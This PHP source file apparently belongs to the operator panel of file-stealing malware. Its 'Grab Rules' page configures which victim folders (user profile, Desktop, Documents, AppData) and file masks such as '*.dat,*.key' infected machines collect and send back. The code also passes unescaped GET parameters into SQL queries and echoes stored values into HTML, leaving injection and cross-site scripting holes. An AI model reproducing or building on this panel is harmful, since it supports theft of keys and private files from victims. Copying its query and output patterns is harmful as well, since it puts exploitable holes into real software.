<?php

include_once 'Configs/Main.Config.php';
include_once 'App/Engine.php';

// -------------------------------------------------------------------------
// auth checker
if($_SESSION["login"] != true)
{
	header('Location: login.php', true, 301);
	exit();
}

// -------------------------------------------------------------------------
// rights checker
if($_SESSION["user"]["grab"] ? false : true)
{
	header('Location: dashboard.php', true, 301);
	exit();
}


$actions = $_GET["action"];
$UID = $_GET["UID"];

// -------------------------------------------------------------------------
// get params
$grab_ruleName = $_GET["grab_ruleName"];
$grab_startPath = $_GET["grab_startPath"];
$grab_fileMasks = $_GET["grab_fileMasks"];

switch($actions)
{
	case "add":
		addRule($db, $grab_ruleName, $grab_startPath, $grab_fileMasks);
		break;
	
	case "delete":
		deleteRule($db, $UID);
		break;
		
	case "modal":
		viewTasks($db);
		break;
		
	case "info":
		viewRule($db, $UID);
		break;
		
	default:
		break;
}

// -------------------------------------------------------------------------
// add rule
function addRule($db, $grab_ruleName, $grab_startPath, $grab_fileMasks)
{
	$db->query("INSERT INTO `grab`(`Name`, `StartPath`, `FileMasks`) VALUES ('$grab_ruleName','$grab_startPath','$grab_fileMasks')");
	
	echo "success";
	
	exit();
}

function viewRule($db, $UID)
{
	$rule = $db->query("SELECT * FROM `grab` WHERE `UID`='$UID'")->fetch_array();
	
	?>
<table class="table table-striped">
	<tbody>
		<tr>
			<th scope="row">UID</th>
			<td><? echo $rule["UID"]; ?></td>
		</tr>
		<tr>
			<th scope="row">Rule Name</th>
			<td><? echo $rule["Name"]; ?></td>
		</tr>
		<tr>
			<th scope="row">Path to start</th>
			<td><? echo $rule["StartPath"]; ?></td>
		</tr>
		<tr>
			<th scope="row">File masks</th>
			<td><? echo $rule["FileMasks"]; ?></td>
		</tr>
		
	</tbody>
</table>
	<?
	
	exit();
}

// -------------------------------------------------------------------------
// view rules
function viewTasks($db)
{
	$grab = $db->query("SELECT * FROM `grab` ORDER BY `UID` DESC LIMIT 100;");
	?>
<table class="table">
	<thead>
		<tr>
			<th scope="col">ID</th>
			<th scope="col">Rule Name</th>
			<th scope="col">Start Path</th>
			<th scope="col">Format</th>
			<th scope="col">Actions</th>
		</tr>
	</thead>
	<tbody>
	<? while ($log = $grab->fetch_assoc()) { ?>
		<tr>
			<th style="text-align: left;padding-top: 18px;"><? echo $log["UID"]; ?></th>
			<td style="text-align: left;padding-top: 18px;"><? echo $log["Name"]; ?></td>
			<td style="text-align: left;padding-top: 18px;"><? echo $log["StartPath"]; ?></td>
			<td style="text-align: left;padding-top: 18px;"><? echo $log["FileMasks"]; ?></td>
			<td style="text-align: left;">
				<div class="dropdown">
					<button class="btn btn-secondary dropdown-toggle" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</button>
					<div class="dropdown-menu">
						<a class="dropdown-item" onclick="viewRule(<? echo $log["UID"]; ?>);" style="cursor: pointer;">More info</a>
						<a class="dropdown-item" onclick="deleteRule(<? echo $log["UID"]; ?>);" style="cursor: pointer;">Delete</a>
					</div>
				</div>
			</td>
		</tr>
	<? } ?>
</tbody>
</table>
	<?

	exit();

}

// -------------------------------------------------------------------------
// delete rule
function deleteRule($db, $UID)
{
	$db->query("DELETE FROM `grab` WHERE `UID`='$UID'");
	echo "success";
	
	exit();
}


$pageID = "Grab Rules";

include_once 'Models/Header.php';

?>
<div class="content content-fixed">
	<div class="container pd-x-0 pd-lg-x-10 pd-xl-x-0">
		<div class="d-sm-flex align-items-center justify-content-between mg-b-20 mg-lg-b-25 mg-xl-b-30">
			<div>
				<h4 class="mg-b-0 tx-spacing--1">Grab Rules</h4>
			</div>
			<div class="d-none d-md-block">
				<a onclick="updateRuleList();" >
					<button class="btn btn-sm pd-x-15 btn-white btn-uppercase"><i class="fas fa-sync"></i>  Refresh</button>
				</a>
				<a onclick="createRuleUI();" >
					<button class="btn btn-sm pd-x-15 btn-white btn-uppercase mg-l-5"><i class="fas fa-plus"></i>  Add rule</button>
				</a>
			</div>
		</div>
		
		<div class="row row-xs">
			<div class="col mg-t-10">
				<div class="card card-dashboard-table">
					<div class="table-responsive">
						<div class="viewTasks"></div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="createRule" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel6" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 60%;">
		<div class="modal-content tx-14">
			<div class="modal-header">
				<h6 class="modal-title" id="exampleModalLabel6">Create Grab Rule</h6>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				
				<form id="createTaskForm" action="loader.php" method="POST">
					<div id="wizard1">
						<h3>General</h3>
						<section>
							<br>
							
							<div class="form-group">
								<label for="grab_ruleName" class="d-block">Rule name</label>
								<div class="input-group mg-b-10">
									<input type="text" class="form-control" placeholder="First rule" id="grab_ruleName">
								</div>
							</div>
							
							<div class="form-group">
								<label for="grab_startPath" class="d-block">Path to start</label>
								<input type="text" class="form-control" placeholder="C:\Users\" id="grab_startPath">
								
								<button type="button" onclick="pathUserProfile();" class="btn btn-xs btn-dark" style="font-size: 10px;margin-top: 6px;" >UserProfile</button>
								<button type="button" onclick="pathDesktop();" class="btn btn-xs btn-dark" style="font-size: 10px;margin-top: 6px;" >Desktop</button>
								<button type="button" onclick="pathDocuments();" class="btn btn-xs btn-dark" style="font-size: 10px;margin-top: 6px;" >Documents</button>
								<button type="button" onclick="pathAppData();" class="btn btn-xs btn-dark" style="font-size: 10px;margin-top: 6px;" >AppData</button>
								<button type="button" onclick="pathLocalAppData();" class="btn btn-xs btn-dark" style="font-size: 10px;margin-top: 6px;" >LocalAppData</button>
							</div>
							
						</section>
						
						<h3>Formats</h3>
						<section>
							<br>
							
							<div class="form-group">
								<label for="grab_fileMasks" class="d-block">File masks</label>
								<textarea id="grab_fileMasks" class="form-control" rows="2" placeholder="*.dat,*.key"></textarea>
							</div>
							
						</section>
					</div>
				</form>
				
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="modalInfo" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel6" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 50%;">
		<div class="modal-content tx-14">
			<div class="modal-header">
				<h6 class="modal-title" id="exampleModalLabel6">Rule Configuration</h6>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body2">
				
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary tx-13" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>

<script>
$('.viewTasks').load("grab.php?action=modal");

function viewRule(id)
{
	var rule_url = `grab.php?action=info&UID=${id}`;
	
    $('.modal-body2').load(rule_url,function(){
        $('#modalInfo').modal({show:true});
    });
};

function pathUserProfile()
{
	document.getElementById("grab_startPath").value = "USERPROFILE\\\\";
};

function pathDesktop()
{
	document.getElementById("grab_startPath").value = "USERPROFILE\\\\Desktop";
};

function pathDocuments()
{
	document.getElementById("grab_startPath").value = "USERPROFILE\\\\Documents";
};

function pathAppData()
{
	document.getElementById("grab_startPath").value = "APPDATA\\\\";
};

function pathAppData()
{
	document.getElementById("grab_startPath").value = "APPDATA\\\\";
};

function pathLocalAppData()
{
	document.getElementById("grab_startPath").value = "LOCALAPPDATA\\\\";
};

function updateRuleList()
{
	$('.viewTasks').load("grab.php?action=modal");
	
	new Noty({
		timeout: 3500,
		text: 'Success: rules list updated',
		type: 'success',
		layout: 'topRight',
		theme: 'bootstrap-v4',
		progressBar: true
	}).show();
};

function createRuleUI()
{
	$('#createRule').modal({show:true});
};

function createRule()
{
	var grab_ruleName = document.getElementById("grab_ruleName").value;
	var grab_startPath = document.getElementById("grab_startPath").value;
	var grab_fileMasks = document.getElementById("grab_fileMasks").value;

	var xhr = new XMLHttpRequest();
	
	xhr.open('GET', `grab.php?action=add&grab_ruleName=${grab_ruleName}&grab_startPath=${grab_startPath}&grab_fileMasks=${grab_fileMasks}`);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.onload = function() 
	{
		if (xhr.status === 200 && xhr.responseText == "success")
		{
			new Noty({
				timeout: 3500,
				text: 'Success: rule created',
				type: 'success',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
			$('#createRule').modal('hide');
		}
		else
		{
			new Noty({
				timeout: 3500,
				text: 'Error: fill rule parameters',
				type: 'error',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		
		$('.viewTasks').load("grab.php?action=modal");
	};
	xhr.send(encodeURI('name'));
};

function deleteRule(id)
{
	var xhr = new XMLHttpRequest();

	xhr.open('GET', `grab.php?action=delete&UID=${id}`);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	
	xhr.onload = function() 
	{
		if (xhr.status === 200 && xhr.responseText == "success")
		{
			new Noty({
				timeout: 3500,
				text: 'Success: rule deleted',
				type: 'success',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		else
		{
			new Noty({
				timeout: 3500,
				text: 'Error: invalid response',
				type: 'error',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		
		$('.viewTasks').load("grab.php?action=modal");
	};
	xhr.send(encodeURI('name'));
};

$('#wizard1').steps(
{
	headerTag: 'h3',
	bodyTag: 'section',
	autoFocus: true,
	titleTemplate: '<span class="number">#index#</span> <span class="title">#title#</span>'
});

$('.actions a[href=\\#finish]').attr('onclick', 'createRule();');

$(".numeric").numeric({ decimal : ".",  negative : false, scale: 3 });

</script>

<? include_once 'Models/Footer.php'; ?>

</body>
</html>